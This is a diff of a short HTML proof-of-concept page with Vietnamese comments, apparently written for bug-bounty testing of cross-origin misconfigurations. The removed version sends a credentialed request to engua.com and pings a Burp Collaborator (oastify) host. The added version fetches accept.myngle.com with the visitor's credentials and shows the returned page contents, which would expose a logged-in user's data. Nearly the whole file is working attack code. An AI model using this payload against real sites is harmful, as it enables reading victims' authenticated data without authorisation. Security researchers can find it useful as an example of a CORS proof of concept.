@@ -1,27 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>PoC crossdomain.xml – engua.com</title>
+  <title>Crossdomain PoC - accept.myngle.com</title>
 </head>
 <body>
-  <h2>🚨 PoC crossdomain.xml – engua.com</h2>
+  <h2>PoC: Đọc dữ liệu từ accept.myngle.com</h2>
+  <pre id="output">Đang thử gửi yêu cầu...</pre>
 
   <script>
-    // Gửi request cross-origin đến engua.com để khai thác crossdomain.xml
-    fetch("https://engua.com/", {
+    fetch("https://accept.myngle.com/", {
       method: "GET",
-      credentials: "include",
-      mode: "no-cors"  // Đảm bảo request được gửi mà không bị chặn CORS
+      credentials: "include"
     })
-    .then(() => {
-      // Ping về Burp Collaborator/Oastify server để chứng minh request đã được gửi
-      fetch("y43dw6efubfyl4y11wfh5d6y7pdg1ip7.oastify.com" + Date.now(), {
-        method: "GET",
-        mode: "no-cors"
-      });
+    .then(response => response.text())
+    .then(data => {
+      document.getElementById("output").textContent = data;
     })
-    .catch(err => console.error("❌ Không thể gửi request:", err));
+    .catch(error => {
+      document.getElementById("output").textContent = "❌ Lỗi: " + error;
+    });
   </script>
 </body>
 </html>
